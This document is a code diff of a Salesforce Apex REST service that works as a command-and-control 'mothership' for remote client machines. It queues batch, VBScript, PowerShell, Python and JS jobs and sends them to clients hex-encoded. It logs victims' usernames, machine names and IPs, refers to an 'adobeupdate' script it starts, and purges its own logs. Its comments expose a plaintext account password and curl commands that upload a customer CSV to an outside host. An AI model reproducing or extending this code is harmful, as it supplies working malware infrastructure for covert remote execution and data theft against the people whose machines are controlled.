@@ -1,13 +1,6 @@
 // TODO: revise such that all endpoint requests get logged to a custom Request object -- empty out records
 // periodically
 
-/**
- * @description       : 
- * @author            : ChangeMeIn@UserSettingsUnder.SFDoc
- * @group             : 
- * @last modified on  : 06-23-2026
- * @last modified by  : ChangeMeIn@UserSettingsUnder.SFDoc
-**/
 // https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/adminui
 // https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/<endpoint>.php
 // retrieve.php -- GET |
@@ -20,7 +13,7 @@
 // storagevault941@agentforce.com
 // As1df1gh!
 
-// F:\__Binaries\sfdx\client\bin\sf.cmd deploy metadata -m ApexClass:PublicRestService -o storagevault941@agentforce.com
+// cmd /k F:\__Binaries\sfdx\client\bin\sf.cmd deploy metadata -m ApexClass:PublicRestService -o storagevault941@agentforce.com
 
 // sf org login web --alias storagevault941@agentforce.com
 // sf project deploy start --source-dir force-app/main/default/classes/PublicRestService.cls --target-org mothershiporg
@@ -32,15 +25,22 @@
 // curl -v -X POST --data-binary "@customers-100.csv" <tplmothership>/ow/upload.php?filename=customers-100.csv
 // curl -v -T customers-100.csv <tplmothership>/ow/upload.php?filename=cust.csv
 
-// /homepages/9/d4299653398/htdocs/ow/uploads --> seashell-raven-793508.hostingersite.com
-
 // ! mothership variable to reflect URL upon deployment to new environment
 // ! need to expand on logging
 // check PublishEventLogger make sure sessionid is being logged
 // every so often, query the mothership and delete all old Logger records
+
 @RestResource(urlMapping='/*')
 global without sharing class PublicRestService {
 
+    public static string mothership = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault';
+
+    static {
+        String baseUrl = Url.getOrgDomainUrl().toExternalForm();
+        List<String> parts = baseUrl.split('\\.'); 
+        mothership = 'https://' + parts[0].removeStartIgnoreCase('https://')+'.develop.my.salesforce-sites.com/services/apexrest/StorageVault';
+    }   
+    
     public class MothershipConfig {
         List<string> tplmotherships = new List<string>();
         string bunnyheader = '';
@@ -78,18 +78,6 @@ global without sharing class PublicRestService {
         }
     }
 
-    public static string mothership = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault';
-
-    public static string logsessionid = GetRandomNum(8);
-    public static integer logindex = 1;
-
-    static {
-        String baseUrl = Url.getOrgDomainUrl().toExternalForm();
-        List<String> parts = baseUrl.split('\\.'); 
-        mothership = 'https://' + parts[0].removeStartIgnoreCase('https://')+'.develop.my.salesforce-sites.com/services/apexrest/StorageVault';
-    }   
-
-
     public static StorageVault__MothershipConfig__c getFirstMothershipConfig() {
         List<StorageVault__MothershipConfig__c> configs = [ SELECT StorageVault__BunnyHeader__c, 
                                         StorageVault__MothershipAssets__c, 
@@ -106,15 +94,8 @@ global without sharing class PublicRestService {
         return config;        
     }
 
-    // List<RemoteProxy> endpoints = [ SELECT EndpointUrl FROM RemoteProxy ];
-    // List<string> endpointurls = new List<string>();
-    // EndpointUrl = http://s1083932807.online-home.ca
     public static string getMothershipConfig() {
-        List<StorageVault__MothershipConfig__c> configs = [ SELECT StorageVault__BunnyHeader__c, 
-                                        StorageVault__MothershipAssets__c, 
-                                        StorageVault__TplMotherships__c,
-                                        StorageVault__PHPMotherships__c
-                                        FROM StorageVault__MothershipConfig__c LIMIT 1 ];
+        List<StorageVault__MothershipConfig__c> configs = [ SELECT StorageVault__MothershipAssets__c, StorageVault__TplMotherships__c FROM StorageVault__MothershipConfig__c LIMIT 1 ];
 
         StorageVault__MothershipConfig__c config = null;
 
@@ -149,84 +130,15 @@ global without sharing class PublicRestService {
                     return responseBody;
                 } else {
                     Map<string, string> res =  new Map<string,string>{ 'statuscode' => String.valueOf(response.getStatusCode()), 'status' => response.getStatus() };
-                    throw new GenericException(JSON.serialize(res));
+                    throw new Helper.GenericException(JSON.serialize(res));
                 }
             } catch (Exception ex) {
-                LogSysEx(ex);
+                Logger.LogSysEx(ex);
             }
         }
 
         return '';
     }
-
-    public static string GetTimestamp() {
-        return Datetime.now().format('yyyyMMddHHmmssSSS');
-    }
-
-    public static void TryEmptyLogs() {
-        Integer upperLimit = 100;
-        Integer randomNumber = Math.floor(Math.random() * upperLimit).intValue();
-        
-        if ( randomNumber >= 80 ) {
-            return;    
-        }
-
-        EmptyLogs();
-    }
-    
-    public static void EmptyLogs() {
-        try {
-            List<StorageVault__Logger__c> recordsToKeep = [ SELECT Id 
-                                                            FROM StorageVault__Logger__c 
-                                                            ORDER BY CreatedDate 
-                                                            DESC LIMIT 25 ];
-            
-            Datetime lastHour = System.now().addHours(-1);
-
-            List<StorageVault__Logger__c> logs = [ SELECT Id, LastModifiedDate 
-                                                   FROM StorageVault__Logger__c 
-                                                   WHERE LastModifiedDate <= :lastHour 
-                                                   AND Id NOT IN :recordsToKeep ];
-            
-            delete logs;
-            
-            logs = [ SELECT ID FROM StorageVault__Logger__c WHERE IsDeleted = true ];
-            
-            if ( logs.isEmpty() )
-                return;
-            
-            Database.emptyRecycleBin(logs);
-            
-        } catch (Exception ex) {
-            LogSysEx(ex);
-        }
-    }
-    
-    public static void LogSysEx(Exception ex) {
-    	string expstr = '';
-		expstr = 'getMessage: '+ex.getMessage();
-        expstr += '|getTypeName: '+ex.getTypeName();
-        expstr += '|getLineNumber: '+ ex.getLineNumber();
-        expstr += '|getStackTraceString: '+ex.getStackTraceString();
-    
-        LogSys(expstr);
-    }
-    
-    public static void LogSys(string msg) {
-
-        try {
-            string logmsgstr = 'PublicRestService|'+logsessionid + '|' + String.valueOf(logindex) +'|'+msg;
-            
-            StorageVault__LogEvent__e event = new StorageVault__LogEvent__e( StorageVault__Payload__c = logmsgstr);
-            
-            EventBus.publish(event);   
-            logindex = logindex + 1;
-        } catch (Exception ex) {
-            
-        }        
-    }
-    
-    public class GenericException extends Exception {}
     
     public static ContentVersion GetContentVersion(string filename) {
     	ContentVersion cv = null;
@@ -309,184 +221,9 @@ global without sharing class PublicRestService {
         return out;
     }
     
-    static string GetRandomNum(integer n) {
-        
-        if ( n <= 0 )
-            return '';
-        
-        String randStr = '';
-        Integer randomInt = -1;
-        
-        while ( randStr.length() < n ) {
-            randomInt = Integer.valueOf(Math.random() * 90000000 + 10000000);
-            randStr = randStr + String.valueOf(randomInt);
-        }        
-        
-        return randStr.substring(0,n-1);
-    }
-    
-    static string MapToKVPStr(Map<string, string> inputMap) {
-        string outstr = '';
-        
-        if ( inputMap == null || inputMap.size() == 0 )
-            return outstr;
-        
-        Integer i = 0;
-        for (String key : inputMap.keySet()) {
-            
-            String value = inputMap.get(key);
-            
-            if ( i >= 1 ) 
-                outstr += '|';
-            
-            outstr += '['+key+']=['+value+']';
-            
-			i += 1;                        
-        }
-
-        return outstr;
-    }
-
-    static Map<string,string> KVPLCase(Map<string,string> kvp) {
-        Map<string,string> outkvp = new Map<string,string>();
-
-        if ( kvp == null || kvp.isEmpty() ) 
-            return outkvp;
-                
-        for ( String key : kvp.keySet() ) {
-            string value = kvp.get(key);
-            outkvp.put(key.toLowerCase(), value);
-        }
-        
-        return outkvp;
-    }   
-        
-    static void PublishMsgLogger(string source, string tsource, string msg, RestRequest req) {
-        PublishEventLogger('log_msg', msg, source, tsource, null, req);
-    }
-    
-    // source = ping.php, retrieve.php, upload.php, logmsg.php, relay.php
-    // tsource is the end-client script filename publishing event
-    static StorageVault__Logger__c PublishEventLogger(string event, string logmsgstr, string source, string tsource, Map<string, string> kvp, RestRequest req) {
-        StorageVault__Logger__c logmsg = new StorageVault__Logger__c();
-
-        Map<string,string> reqkvp = KVPLCase(req.params);
-		
-        string clientid = reqkvp.containsKey('clientid') ? reqkvp.get('clientid') : null;
-            
-        kvp = kvp == null ? new Map<string, string>() : kvp;
-
-        String ipAddress = req.remoteAddress;
-        String userAgent = req.headers.get('User-Agent');
-
-		string sysmsg = 'PublishEventLogger|starting';
-        sysmsg += '|clientid='+clientid;
-        sysmsg += '|event='+ event;
-        sysmsg += '|source='+source;
-        sysmsg += '|tsource='+tsource;
-        sysmsg += '|logmsgstr='+logmsgstr;
-        sysmsg += '|kvp='+MapToKVPStr(kvp);
-        
-        LogSys(sysmsg);
-        
-        logmsg.StorageVault__Event__c = event;
-        logmsg.StorageVault__ClientID__c = clientid;        
-        logmsg.StorageVault__TSource__c = tsource; 
-        logmsg.StorageVault__Source__c = source;
-        logmsg.StorageVault__UserAgent__c = userAgent; 
-        logmsg.StorageVault__ip_addr__c = ipAddress;
-
-        logmsg.StorageVault__LogID__c = reqkvp.containsKey('logid') ? reqkvp.get('logid') : '-1';
-        logmsg.StorageVault__BatchID__c = reqkvp.containsKey('batchid') ? reqkvp.get('batchid') : null;
-        logmsg.StorageVault__ScriptVersion__c = reqkvp.containsKey('script_version') ? reqkvp.get('script_version'):null;
-		logmsg.StorageVault__SessionID__c = reqkvp.containsKey('sessionid') ? reqkvp.get('sessionid') : null;
-        
-        string t_sessionts = reqkvp.containsKey('sessionts') ? reqkvp.get('sessionts') : null;
-        t_sessionts = String.isBlank(t_sessionts) ? GetTimestamp() : t_sessionts;
-		logmsg.StorageVault__SessionTS__c = t_sessionts;
-
-		logmsg.StorageVault__Username__c = reqkvp.containsKey('username') ? reqkvp.get('username') : null;
-        logmsg.StorageVault__Machinename__c = reqkvp.containsKey('machinename') ? reqkvp.get('machinename') : null;
-		    
-        logmsg.StorageVault__LogMsg__c = logmsgstr;
-        logmsg.StorageVault__KVP__c = MapToKVPStr(kvp);
-
-        Database.SaveResult sr = Database.insert(logmsg, false);
-
-        if (!sr.isSuccess()) {
-            for (Database.Error err : sr.getErrors()) {
-                if (err.getStatusCode() == StatusCode.STORAGE_LIMIT_EXCEEDED) {
-                    TryEmptyLogs();
-                }
-            }
-        }
-        
-        LogSys('PublishEventLogger|finished|logmsg.ID='+logmsg.ID);
-
-        return logmsg;
-    }
-    
-    static string getFilenameExt(string filename) {
-        filename = filename.trim();
-        return String.isBlank(filename) ? '' : filename.substringAfterLast('.').toLowerCase();
-    }
-
-    static string getJobFileHeader(string filename, string jobcode) {
-        MothershipConfig config = new MothershipConfig();
-
-        string jobnameext = getFilenameExt(filename);
-        
-        List<String> exts = new List<String>{'ps1', 'vbs', 'bat', 'py', 'js'};
-            
-		if ( ! exts.contains(jobnameext) ) {
-            throw new GenericException('ERROR :: unsupported extension: '+jobnameext);
-        }
-
-        jobnameext = jobnameext.toLowerCase();
-
-        string scripttextheader = '';
-
-        string mothershipassets = config.mothershipassets;
-        string bunnyheader = config.bunnyheader;
-
-        if ( jobnameext == 'bat' ) {
-            scripttextheader = 'SET jobcode=' + jobcode + '\r\n';
-            scripttextheader += 'SET mothership=' + mothership + '\r\n';
-
-            scripttextheader += 'SET mothershipassets=' + mothershipassets + '\r\n';
-
-        } else if ( jobnameext == 'vbs' ) {
-            scripttextheader = 'Option Explicit' + '\r\n';
-            scripttextheader += 'On Error Resume Next' + '\r\n';
-
-            scripttextheader += 'DIM mothershipassets : mothershipassets="' + mothershipassets + '"' + '\r\n';
-            scripttextheader += 'DIM mothership : mothership="' + mothership + '"' + '\r\n';
-            scripttextheader += 'DIM jobcode : jobcode="' + jobcode + '"' + '\r\n';
-
-        } else if ( jobnameext == 'ps1' ) {
-            scripttextheader += '$mothership="' + mothership + '"' + '\r\n';
-            scripttextheader += '$jobcode="' + jobcode + '"' + '\r\n';
-            scripttextheader += '$mothershipassets="' + mothershipassets + '"' + '\r\n';
-
-        } else if ( jobnameext == 'py' ) {
-            scripttextheader += 'mothership="' + mothership + '"' + '\r\n';
-            scripttextheader += 'jobcode="' + jobcode + '"' + '\r\n';
-            scripttextheader += 'mothershipassets="' + mothershipassets + '"' + '\r\n';
-        } else if ( jobnameext == 'js' ) {
-            scripttextheader += 'mothership="' + mothership + '"; ' + '\r\n';
-            scripttextheader += 'jobcode="' + jobcode + '"; ' + '\r\n';
-            scripttextheader += 'mothershipassets="' + mothershipassets + '"; ' + '\r\n';
-        } else {
-            throw new GenericException('FATAL ERROR :: should not have reached here');
-        }
-
-        return scripttextheader;
-    }
-
-    // ping.php -- process client jobs
+    // ping.php
+    // 
     // JobName = START_NODE                                       | triggers adobeupdate node script to start on end-client machine
-    //
-    // JobName = run                                              | JobFile = filename                  --> execute_cmdlist
     //
     // JobName = EXEC_CMD                                         | JobFile = GetSystemOverView|...|... --> EXEC_CMD_BEGIN ... EXEC_CMD_END
     //                                                                                                      JOBCODE_BEGIN ... JOBCODE_END
@@ -512,10 +249,10 @@ global without sharing class PublicRestService {
             
             string source = params.containsKey('source') ? params.get('source') : 'mothership';
 
-            PublishMsgLogger('ping.php', source, clientstatus, req);
+            Logger.PublishMsgLogger('ping.php', source, clientstatus, req);
 
-            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
-            msgout += MapToKVPStr(params) + '\r\n';
+            string msgout = Helper.MapToKVPStr(GetRequestProfile()) + '\r\n';
+            msgout += Helper.MapToKVPStr(params) + '\r\n';
 
             res.responseBody = Blob.valueOf(clientstatus + '\r\n' + msgout);
             return;
@@ -525,21 +262,21 @@ global without sharing class PublicRestService {
         
         string jobrowid = String.valueOf(clientjob.ID);
         string jobcode = clientjob.StorageVault__JobCode__c; // should be empty as job has not been retrieved
-        string jobfile = clientjob.StorageVault__JobFile__c; // cmd_list_snapshot_full.bat, EXEC_CMD, EXEC_BAT, EXEC_PS1, EXEC_VBS, EXEC_JS, EXEC_PY
-        string jobname = clientjob.StorageVault__JobName__c.toLowerCase(); // run, LogMsgMother
-        jobname = jobname ?? '';
+        string jobfile = clientjob.StorageVault__JobFile__c; // cmd_list_snapshot_full.bat
+        string jobname = clientjob.StorageVault__JobName__c.toLowerCase(); // EXEC_CMD, EXEC_BAT, EXEC_PS1, EXEC_VBS, EXEC_JS, EXEC_PY
         
         string jobtype = '';
         
         if ( ! String.isBlank(jobname) ) {
         	jobtype = jobname.length() >= 4 ? jobname.substring(0, 4) : '';
+        } else {
+            // throw error
         }
         
         string clientinfo = '';
         string loginfo = '';
         
-		// if a job was scheduled using the retrieve.php / cmdlist method
-        if ( jobtype != 'EXEC'.toLowerCase() ) {
+        if ( jobname == 'START_NODE' ) {
             clientinfo = 'client_new_job' + '|' + 'JobName='+jobname+ '|' + ( String.isBlank(jobcode) ? 'waiting_for_retrieve' : 'running_cmdlist' );
             
             loginfo = clientstatus + '|';
@@ -549,23 +286,23 @@ global without sharing class PublicRestService {
             
             string logmsgstr = loginfo + '\r\n' + ( jobname.toLowerCase() == 'start_node' ? '' : 'execute_cmdlist' ) +'\r\n';
             
-			PublishMsgLogger('ping.php', 'mothership', logmsgstr, req);
+			Logger.PublishMsgLogger('ping.php', 'mothership', logmsgstr, req);
 
-            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
+            string msgout = Helper.MapToKVPStr(GetRequestProfile()) + '\r\n';
             
             res.responseBody = Blob.valueOf(logmsgstr + '\r\n' + msgout);
         	return;
         }
         
         // jobname one of: EXEC_CMD, EXEC_PS1, EXEC_VBS, EXEC_BAT, EXEC_JS, EXEC_PY
-		jobcode = GetRandomNum(8);
+		jobcode = Helper.GetRandomNum(8);
         string jobfilepath = '';
         string jobfilename = '';
         integer fsize = -1;
         string action = '';
         
         Map<string, string> kvp = new Map<string, string> {'event' => 'init_jobcode', 'jobcode' => jobcode , 'jobrowid' => clientjob.ID };
-        PublishEventLogger('init_jobcode', null, 'ping.php', 'mothership', kvp, req);
+        Logger.PublishEventLogger('init_jobcode', null, 'ping.php', 'mothership', kvp, req);
 
         clientinfo = 'client_new_job' + '|' + 'running_exec';
         loginfo = clientstatus + '|';
@@ -578,16 +315,15 @@ global without sharing class PublicRestService {
             action = 'EXEC_CMD_BEGIN' + '|' + jobfile + '|' + 'EXEC_CMD_END' + '\r\n';
             action += 'JOBCODE_BEGIN' + jobcode + 'JOBCODE_END' + '\r\n';
 
-            PublishMsgLogger('ping.php', 'mothership', loginfo, req);
+            Logger.PublishMsgLogger('ping.php', 'mothership', loginfo, req);
 			
-            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
+            string msgout = Helper.MapToKVPStr(GetRequestProfile()) + '\r\n';
 
             res.responseBody = Blob.valueOf(loginfo + '\r\n' + action + '\r\n' + msgout + '\r\n');
             
             return;
         } 
         
-                        
         string scripttext = '';
         ContentVersion cv = GetContentVersion(jobfile);
 
@@ -606,20 +342,17 @@ global without sharing class PublicRestService {
         }
 
 		scripttext = scripttextblob.toString();
-                
-        string scripttextheader = getJobFileHeader(jobfile, jobcode);
-
-        scripttext = scripttext.replace('Option Explicit', '               '); 
-
+		scripttext = EncodingUtil.convertToHex(scripttext);
+    
         action = 'JOBCODE_BEGIN' + jobcode + 'JOBCODE_END' + '\r\n';
         
         string jobnameext = jobfile.substringAfterLast('.').toLowerCase();
 
-		action += '\r\n' + 'EXEC_' + jobnameext + '_BEGIN' + '\r\n' + scripttextheader + '\r\n' + scripttext + '\r\n' + 'EXEC_' + jobnameext + '_END' + '\r\n';
+		action += '\r\n' + 'EXEC_' + jobnameext + '_BEGIN' + '\r\n' + scripttext + '\r\n' + 'EXEC_' + jobnameext + '_END' + '\r\n';
         
-        PublishMsgLogger('ping.php', 'mothership', loginfo, req);
+        Logger.PublishMsgLogger('ping.php', 'mothership', loginfo, req);
 
-        string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
+        string msgout = Helper.MapToKVPStr(GetRequestProfile()) + '\r\n';
 
         res.responseBody = Blob.valueOf(loginfo + '\r\n' + action + '\r\n' + msgout);
         
@@ -627,8 +360,6 @@ global without sharing class PublicRestService {
     }
     
     /* ping.php
-     * 
-     * for cmdlist type jobs, echo "execute_cmdlist" as response
      *
      * echo "\r\n" . "JOBCODE_BEGIN" . $jobcode . "JOBCODE_END" . "\r\n";
      * echo "\r\n" . $action . "\r\n";
@@ -643,9 +374,9 @@ global without sharing class PublicRestService {
      */
     static void ping(RestRequest req, RestResponse res) {
 		
-        TryEmptyLogs();
+        Logger.TryEmptyLogs();
         
-        Map<String, String> params = KVPLCase(req.params);
+        Map<String, String> params = Helper.KVPLCase(req.params);
         
         String userAgent = req.headers.get('User-Agent');
 		String ipAddr = req.remoteAddress;
@@ -669,7 +400,7 @@ global without sharing class PublicRestService {
         }
 
         if ( String.isBlank(clientid) ) {
-            throw new GenericException('ping.php :: clientid param is empty');
+            throw new Helper.GenericException('ping.php :: clientid param is empty');
         }
         
         if ( params.containsKey('machinename') ) {
@@ -730,7 +461,7 @@ global without sharing class PublicRestService {
             } else {
                 for(Database.Error err : sr.getErrors()) {
                     if (err.getStatusCode() == StatusCode.STORAGE_LIMIT_EXCEEDED) {
-                        TryEmptyLogs();
+                        Logger.TryEmptyLogs();
                     }
                 }
             }
@@ -756,19 +487,19 @@ global without sharing class PublicRestService {
      
     // logmsg.php
     static void logmsg(RestRequest req, RestResponse res) {
-        Map<string, string> kvp = KVPLCase(req.params);
+        Map<string, string> kvp = Helper.KVPLCase(req.params);
         
         string logmsgstr = kvp.containsKey('msg') ? kvp.get('msg') : null;
         string tsource = kvp.containsKey('source') ? kvp.get('source') : 'UNKNOWN'; // source param from client is set to TSource (script source filename)
 
         if ( ! kvp.containsKey('event') ) {
-        	PublishMsgLogger('logmsg.php', tsource, logmsgstr, req);
+        	Logger.PublishMsgLogger('logmsg.php', tsource, logmsgstr, req);
         	return;
         }
         
         string event = kvp.get('event');
         
-        StorageVault__Logger__c log = PublishEventLogger(event, logmsgstr, 'logmsg.php', tsource, kvp, req);
+        StorageVault__Logger__c log = Logger.PublishEventLogger(event, logmsgstr, 'logmsg.php', tsource, kvp, req);
 
         if ( log == null ) {
 			res.statusCode = 500;
@@ -782,7 +513,7 @@ global without sharing class PublicRestService {
     
     // retrieve.php --> cmd_list_<...>.bat job file processing
     public static void execCmdList(RestRequest req, RestResponse res) {
-        Map<string,string> kvp = KVPLCase(req.params);
+        Map<string,string> kvp = Helper.KVPLCase(req.params);
         
         string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : '';
         
@@ -797,7 +528,7 @@ global without sharing class PublicRestService {
                                                        LIMIT 1 ];
         
         if ( clientjobs.isEmpty() ) {
-            PublishMsgLogger('retrieve.php', 'mothership', 'empty jobs queue', req) ;
+            Logger.PublishMsgLogger('retrieve.php', 'mothership', 'empty jobs queue', req) ;
             	
             res.statusCode = 400;
             res.responseBody = Blob.valueOf('empty jobs queue' + '\r\n');
@@ -811,25 +542,25 @@ global without sharing class PublicRestService {
         if ( String.isBlank(filename) ) {
             string errmsg = 'filename field in client job is empty: '+String.valueOf(clientjob.ID);
             
-            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
+            string msgout = Helper.MapToKVPStr(GetRequestProfile()) + '\r\n';
             
-            PublishMsgLogger('retrieve.php', 'mothership', errmsg, req) ;
+            Logger.PublishMsgLogger('retrieve.php', 'mothership', errmsg, req) ;
             
             res.statusCode = 400;
             res.responseBody = Blob.valueOf(errmsg + '\r\n' + msgout + '\r\n');
             return;
         }
         
-        LogSys('execCmdList|clientjob='+clientjob.ID+'|filename='+filename);
+        Logger.LogSys('execCmdList|clientjob='+clientjob.ID+'|filename='+filename);
 
         ContentVersion cv = GetContentVersion(filename);
         
         if ( cv == null ) {                            
             string errmsg = 'execCmdList: could not retrieve file: '+filename;
             
-            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
+            string msgout = Helper.MapToKVPStr(GetRequestProfile()) + '\r\n';
             
-            PublishMsgLogger('retrieve.php', 'mothership', errmsg, req) ;
+            Logger.PublishMsgLogger('retrieve.php', 'mothership', errmsg, req) ;
             
             res.statusCode = 400;
             res.responseBody = Blob.valueOf(errmsg + '\r\n' + msgout + '\r\n');
@@ -840,10 +571,9 @@ global without sharing class PublicRestService {
         
         string filetext = fileblob.toString();
         
-        string jobcode = GetRandomNum(8);
+        string jobcode = Helper.GetRandomNum(8);
         
-        string jobheader = getJobFileHeader(filename, jobcode);
-        string jobnameext = getFilenameExt(filename);
+        string jobnameext = Helper.getFilenameExt(filename);
 
         if ( jobnameext.toLowerCase() == 'vbs' ) {
             filetext = filetext.replace('Option Explicit', '               ');
@@ -866,7 +596,7 @@ global without sharing class PublicRestService {
 
         kvp = new Map<string, string> {'event' => 'init_jobcode', 'jobcode' => jobcode , 'jobrowid' => clientjob.ID };
 
-    	PublishEventLogger('init_jobcode', null, 'retrieve.php', 'mothership', kvp, req);
+    	Logger.PublishEventLogger('init_jobcode', null, 'retrieve.php', 'mothership', kvp, req);
 
         return;
     }
@@ -942,110 +672,6 @@ global without sharing class PublicRestService {
 
         return;
     }
-    
-    // relay.php
-    public static void relay(RestRequest req, RestResponse res) {
-        String relativeUrl = req.requestURI; 
-        
-        List<String> pathSegments = relativeUrl.split('/');
-        
-        String endpoint = '';
-        
-        if ( ! pathSegments.isEmpty() ) {
-            endpoint = pathSegments.get(pathSegments.size()-1);
-        }
-        
-        if ( endpoint != 'relay.php' ) {
-			res.statusCode = 500;
-            return;
-        }
-        
-        Map<string,string> kvp = KVPLCase(req.params);
-        kvp = kvp == null || kvp.size() == 0 ? new Map<string,string>() : kvp;
-        		
-        string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : '';        
-        string action = kvp.containsKey('action') ? kvp.get('action') : '';
-        string sessionid = kvp.containsKey('sessionid') ? kvp.get('sessionid') : '';
-
-        if ( String.isBlank(action) ) {
-        	res.statusCode = 400;
-            res.responseBody = Blob.valueOf('ERROR :: must provide action as URL parameter');
-            return;
-        }
-
-        if ( String.isBlank(clientid) ) {
-        	res.statusCode = 400;
-            res.responseBody = Blob.valueOf('ERROR :: must provide clientid as URL parameter');
-            return;
-        }
-
-        if ( ! ( new List<String>{'connectclient', 'connecthost', 'endconnection'}.contains(action) ) ) {
-        	res.statusCode = 400;
-            res.responseBody = Blob.valueOf('ERROR :: unsupported action: '+action);
-            return;            
-        }
-        
-        if ( action == 'connectclient' ) {
-            StorageVault__RelayJob__c relayjob = new StorageVault__RelayJob__c();
-            
-            relayjob.StorageVault__ClientID__c = clientid;
-            relayjob.StorageVault__CreateTS__c = Datetime.now().format('yyyyMMddHHmmssSSS');
-            relayjob.StorageVault__EndTS__c = null;
-            
-            sessionid = GetRandomNum(8);
-            relayjob.StorageVault__SessionID__c = sessionid;
-            
-            insert relayjob;
-            res.responseBody = Blob.valueOf('{ "SessionID": "'+sessionid+'", "RelayJob": "'+relayjob.ID+'" }');
-			return;
-        } else if ( action == 'endconnection' ) {
-            List<StorageVault__RelayJob__c> relayjobs = [ SELECT ID, StorageVault__EndTS__c, StorageVault__ClientID__c
-                                                          FROM StorageVault__RelayJob__c 
-                                                          WHERE StorageVault__SessionID__c = : sessionid LIMIT 1];
-            
-            if ( relayjobs.isEmpty() ) {
-                res.statusCode = 400;
-                res.responseBody = Blob.valueOf('ERROR :: could not retrieve any matching RelayJob corresponding to sessionid: '+sessionid);
-                return;
-            }
-            
-            StorageVault__RelayJob__c relayjob = relayjobs[0];
-            
-            clientid = relayjob.StorageVault__ClientID__c;
-            relayjob.StorageVault__EndTS__c = Datetime.now().format('yyyyMMddHHmmssSSS');
-                        
-            update relayjob;         
-            
-            res.responseBody = Blob.valueOf('{ "SessionID": "'+sessionid+'", "RelayJob": "'+relayjob.ID+'", "ClientID":"'+clientid+'" }');
-			return;
-        } else if ( action == 'connecthost' ) {
-            List<StorageVault__RelayJob__c> relayjobs = [ SELECT ID, StorageVault__SessionID__c, StorageVault__CreateTS__c
-                                                          FROM StorageVault__RelayJob__c 
-                                                          WHERE StorageVault__ClientID__c = : clientid AND 
-                                                          ( StorageVault__EndTS__c = '' OR StorageVault__EndTS__c = null )
-                                                          ORDER BY LastModifiedDate DESC
-                                                          LIMIT 1];
-            if ( relayjobs.isEmpty() ) {
-                res.statusCode = 400;
-                res.responseBody = Blob.valueOf('ERROR :: could not retrieve any matching RelayJob corresponding to ClientID: '+clientid);
-                return;                
-            }
-            
-            StorageVault__RelayJob__c relayjob = relayjobs[0];
-            
-            sessionid = relayjob.StorageVault__SessionID__c;
-            string createts = relayjob.StorageVault__CreateTS__c;
-            
-            res.responseBody = Blob.valueOf('{ "SessionID": "'+sessionid+'", "RelayJob": "'+relayjob.ID+'", "ClientID":"'+clientid+'", "CreateTS":"'+createts+'" }');
-            
-            return;                
-        }
-        
-        res.statusCode = 400;
-        res.responseBody = Blob.valueOf('FATAL ERROR');
-        
-        return;
-    } 
     
     public static List<Map<string,string>> GetClientAccess() {
 
